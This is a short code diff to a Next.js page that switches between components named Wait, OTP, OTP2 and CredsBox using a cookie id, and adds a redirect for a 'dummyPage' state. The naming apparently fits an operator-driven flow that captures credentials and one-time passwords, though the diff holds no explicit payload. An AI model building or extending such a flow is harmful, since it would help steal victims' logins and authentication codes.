@@ -7,7 +7,9 @@ import OTP2 from "./components/OTP2";
 import { getCookie } from "cookies-next";
 import Wait from "./components/Wait";
 import CredsBox from "../components/CredsBox";
+import { useRouter } from "next/router";
 export default function Home() {
+  const router = useRouter();
   var id = getCookie("id");
   const [currAction, setcurrAction] = useState("wait");
 
@@ -40,10 +42,9 @@ export default function Home() {
       return <OTP id={id} />;
     } else if (currAction == "OTP2") {
       return <OTP2 id={id} />;
+    } else if (currAction == "dummyPage") {
+      router.push("../Home");
     }
   };
-  return (
-      <CredsBox curr_component={pageChanger()} />
-    
-  );
+  return <CredsBox curr_component={pageChanger()} />;
 }
